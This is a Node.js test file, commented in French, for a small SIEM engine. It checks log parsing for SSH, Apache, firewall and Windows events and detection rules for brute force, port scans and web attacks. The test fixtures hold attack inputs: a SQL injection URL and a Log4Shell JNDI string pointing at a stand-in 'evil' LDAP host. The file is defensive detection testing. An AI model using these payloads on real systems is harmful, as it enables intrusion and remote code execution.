/* Tests Node du moteur JS : il doit détecter les mêmes scénarios que la
 * version Python. Lancer : node web/demo.test.js
 */
const S = require("./minisiem.js");
const RULES = require("./rules.data.js");

let pass = 0, fail = 0;
function ok(name, cond) {
  if (cond) { pass++; } else { fail++; console.error("  ECHEC:", name); }
}
function ids(alerts) { return new Set(alerts.map(a => a.rule_id)); }

// Parsing
ok("parse auth failed", (() => {
  const e = S.parseAuth("Nov  8 02:00:05 web01 sshd[1]: Failed password for root from 203.0.113.66 port 1 ssh2", 2026);
  return e && e.event_type === "ssh_login" && e.outcome === "failure" && e.source_ip === "203.0.113.66";
})());
ok("parse apache 404", (() => {
  const e = S.parseApache('203.0.113.9 - - [08/Nov/2026:13:37:01 +0100] "GET /.env HTTP/1.1" 404 512 "-" "sqlmap/1.7"');
  return e && e.status === 404 && e.user_agent.indexOf("sqlmap") >= 0;
})());
ok("parse ufw block", (() => {
  const e = S.parseUfw("Nov  8 13:37:01 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=5 DPT=23", 2026);
  return e && e.event_type === "fw_block" && e.dest_port === 23;
})());
ok("parse evtx 4625", (() => {
  const e = S.parseEvtxBlock('<Event><System><EventID>4625</EventID><TimeCreated SystemTime="2026-11-08T02:00:05Z"/><Computer>DC01</Computer></System><EventData><Data Name="TargetUserName">administrateur</Data><Data Name="IpAddress">203.0.113.66</Data></EventData></Event>');
  return e && e.event_id === 4625 && e.outcome === "failure";
})());

// Détections
function ssh(secs, outcome, ip) {
  return {timestamp: new Date(2026, 10, 8, 10, 0, secs), event_type: "ssh_login",
          outcome: outcome, source_ip: ip, user: "admin", raw: "x"};
}
ok("ssh bruteforce", ids(S.runRules(RULES, Array.from({length:15}, (_,i)=>ssh(5*i,"failure","203.0.113.66")))).has("SSH_BRUTEFORCE"));
ok("ssh bruteforce quiet<threshold", !ids(S.runRules(RULES, Array.from({length:4}, (_,i)=>ssh(5*i,"failure","203.0.113.66")))).has("SSH_BRUTEFORCE"));

ok("ssh bruteforce success", (() => {
  const ev = Array.from({length:6}, (_,i)=>ssh(5*i,"failure","198.51.100.23"));
  ev.push(ssh(40,"success","198.51.100.23"));
  return ids(S.runRules(RULES, ev)).has("SSH_BRUTEFORCE_SUCCESS");
})());

ok("web injection", (() => {
  const e = {timestamp:new Date(2026,10,8,10,0,0), event_type:"web_request", outcome:"failure",
             source_ip:"203.0.113.9", status:500, user_agent:"x",
             url:"/p.php?id=1'%20UNION%20SELECT%20pass%20FROM%20users--", raw:"x"};
  return ids(S.runRules(RULES, [e])).has("WEB_INJECTION");
})());
ok("log4shell", (() => {
  const e = {timestamp:new Date(2026,10,8,10,0,0), event_type:"web_request", outcome:"success",
             source_ip:"203.0.113.9", status:200, user_agent:"x",
             url:"/s?q=${jndi:ldap://evil/a}", raw:"x"};
  return ids(S.runRules(RULES, [e])).has("WEB_LOG4SHELL");
})());
ok("port scan distinct", (() => {
  const ev = Array.from({length:25}, (_,i)=>({timestamp:new Date(2026,10,8,10,0,i),
    event_type:"fw_block", outcome:"blocked", source_ip:"198.51.100.77", dest_port:i+1, raw:"x"}));
  return ids(S.runRules(RULES, ev)).has("PORT_SCAN");
})());
ok("port scan same port quiet", (() => {
  const ev = Array.from({length:25}, (_,i)=>({timestamp:new Date(2026,10,8,10,0,i),
    event_type:"fw_block", outcome:"blocked", source_ip:"198.51.100.77", dest_port:443, raw:"x"}));
  return !ids(S.runRules(RULES, ev)).has("PORT_SCAN");
})());
ok("unusual hour", (() => {
  const ev = [];
  for (const h of [8,9,10,11]) for (let k=0;k<2;k++)
    ev.push({timestamp:new Date(2026,10,8,h,10*k), event_type:"win_logon", outcome:"success",
             event_id:4624, user:"jdupont", raw:"x"});
  ev.push({timestamp:new Date(2026,10,8,3,12), event_type:"win_logon", outcome:"success",
           event_id:4624, user:"jdupont", raw:"x"});
  const a = S.runRules(RULES, ev).filter(x=>x.rule_id==="WIN_UNUSUAL_HOUR");
  return a.length===1 && a[0].count===1;
})());

// CTI
const FEED = require("./threat_feed.js");
const cti = S.ctiIndex(FEED);
ok("cti detects known-bad below threshold", (() => {
  const ev = Array.from({length:3}, (_,i)=>ssh(30*i,"failure","203.0.113.200"));
  const ruleAlerts = S.runRules(RULES, ev);
  const ctiAlerts = S.ctiDetectContacts(cti, ev, ruleAlerts);
  return ctiAlerts.length===1 && ctiAlerts[0].rule_id==="THREAT_INTEL_HIT" && ctiAlerts[0].severity==="critical";
})());
ok("cti enriches matching alert", (() => {
  const ev = Array.from({length:15}, (_,i)=>ssh(5*i,"failure","203.0.113.66"));
  const al = S.runRules(RULES, ev);
  S.ctiEnrich(al, cti);
  const bf = al.find(a=>a.rule_id==="SSH_BRUTEFORCE");
  return bf.threat && bf.threat.category==="bruteforce";
})());

console.log(`\nJS engine: ${pass} réussis, ${fail} échoués.`);
process.exit(fail ? 1 : 0);
